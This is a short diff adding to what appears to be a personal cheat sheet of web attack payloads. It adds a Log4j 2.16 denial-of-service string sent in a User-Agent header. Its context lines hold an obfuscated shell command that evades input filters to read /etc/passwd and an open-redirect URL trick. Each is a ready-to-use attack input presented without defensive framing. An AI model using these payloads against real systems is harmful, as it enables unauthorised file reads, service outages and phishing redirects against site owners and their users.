@@ -403,6 +403,16 @@ Bypass white list validation
  E.g.: reading /etc/passwd file:
 cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
  
+ ---------------------------------------------------------------------------------------------------
+ 	dos attack via user-agent
+ Log4j 2.16 vulnerability DoS  🫰
+User-Agent: ${${::-${::-$${::-j}}}}
+
+- Paylaod: ${${::-${::-$${::-j}}}}  
+ 
+ 
+ 
+ 
  --------------------------------------------------------------------------------------------------
                                 open redirect
  https://example.com_https@google.com
